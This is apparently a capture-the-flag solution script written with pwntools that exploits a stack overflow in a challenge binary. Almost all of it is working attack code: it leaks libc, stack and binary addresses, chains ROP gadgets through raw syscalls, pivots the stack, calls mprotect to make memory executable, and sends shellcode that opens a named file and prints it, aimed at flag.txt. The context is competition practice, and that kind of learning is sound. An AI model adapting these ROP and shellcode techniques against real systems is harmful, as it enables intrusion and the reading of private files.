#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("./challe")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# context.log_level='debug'
# p = remote("challs.pwnoh.io", 13371)
p = process([exe.path])
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

p.recvuntil("Try it yourself: it's at ")
addr = int(p.recvuntil("Surely that's",drop=True),16)
libc.address = addr - libc.sym.system
log.info(f"system: {hex(addr)}")
log.info(f"libc: {hex(libc.address)}")
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address+0x000000000002be51
pop_rax = libc.address + 0x0000000000045eb0
pop_rdx = libc.address + 0x000000000011f2e7
pop_rbp = libc.address + 0x000000000002a2e0
ret = libc.address + 0x0000000000029139
sysc = libc.address + 0x114885
push_rax = libc.address+0x0000000000041563
section = libc.address + 0x21a000
leave_ret = libc.address + 0x000000000004da83
log.info(f"section rw: {hex(section+0x1500)}")
payload = b"a"*40
def syscall(rax,rdi=0,rsi=0,rdx=0):
    payload=p64(pop_rdi)+p64(rdi)
    payload+=p64(pop_rsi)+p64(rsi)
    payload+=p64(pop_rdx)+p64(rdx)+p64(0)
    payload+=p64(pop_rax)+p64(rax)
    payload+=p64(sysc)
    return payload
# payload+=p64(pop_rdi)+p64(section+0x1000)
# payload+=p64(libc.sym.gets)
# payload+=p64(pop_rdi)+p64(section+0x1000)
# payload+=p64(libc.sym.open)
# payload+=p64(pop_rdi)+p64(3)
# payload+=p64(pop_rsi)+p64(section+0x1500)
# payload+=p64(pop_rdx)+p64(100)+p64(0)
# payload+=p64(pop_rax)+p64(0)
# payload+=p64(syscall)
# payload+=p64(pop_rdi)
# payload+=p64(section+0x1500)
# payload+=p64(libc.sym.puts)
# payload += syscall(0,0,section+0x1000,100)
# payload += syscall(2,section+0x1000,0x241,0o644)
# payload += syscall(0,3,section+0x1500,100)
payload+=p64(pop_rdi)
payload+=p64(libc.search("version_hook").__next__())
payload+=p64(libc.sym.puts)
payload+=p64(pop_rdi)
payload+=p64(libc.sym.environ)
payload+=p64(libc.sym.puts)
payload+=p64(pop_rbp)+ p64(section+0x1000-8)
payload += syscall(0,0,section+0x1000,0x100)
payload += p64(leave_ret)

sla("else.",payload)
p.recvuntil("version_hook\n")
addr = u64(p.recv(6).ljust(8,b"\0"))
log.info(f"leakstack: {hex(addr)}")
addr_leak = addr - 80
log.info(f"leakstack: {hex(addr_leak)}")
payload=p64(pop_rdi)
payload+=p64(libc.search("version_hook").__next__())
payload+=p64(libc.sym.puts)
payload+=p64(pop_rdi)
payload+=p64(addr_leak)
payload+=p64(libc.sym.puts)
payload+=p64(pop_rbp)+ p64(section+0x1100-8)
payload+= syscall(0,0,section+0x1100,0x500)
payload+= p64(leave_ret)
sl(payload)

p.recvuntil("version_hook\n")
addr = u64(p.recv(6).ljust(8,b"\0"))
log.info(f"leak binary: {hex(addr)}")
exe.address = addr - exe.sym._start
log.info(f"base address: {hex(exe.address)}")
rw_section = exe.address + 0x5578
log.info(f"rw_section: {hex(rw_section)}")
rw_binary = exe.address + 0x4000

payload =  p64(pop_rdi) + p64(libc.search("version_hook").__next__())+p64(libc.sym.puts)
payload += syscall(0xa,section,0x2000,7)
payload+= syscall(0,0,section+0x1200,0x800)
payload+= p64(section+0x1200)
sl(payload)
shell = """
                mov rax,0
                xor rdi,rdi
                mov rsi,{section+0x1000}
                mov rdx,100
                syscall
"""
shellcode = asm(f"""
                mov rax,0
                mov rdi,0
                mov rsi,{section+0x1000}
                mov rdx,0x100
                syscall
                mov byte ptr[rsi+rax-1],0
                mov rax,2
                mov rdi,{section+0x1000}
                mov rsi, 0             
                mov rdx, 0    
                syscall
                mov rdi,rax
                mov rax,0
                mov rsi,{rw_section}
                mov rdx,0x80
                xor r8,r8
                xor rcx,rcx
                syscall
                mov rdi,1
                mov rsi,{rw_section}
                mov rdx,0x80
                mov rax,1
                syscall
                """,arch="amd64")
gdbs()
sla("version_hook",shellcode)
# input()
# sl("flag.txt\0")
# sl("cat flag.txt")







p.interactive()
# good luck pwning :)

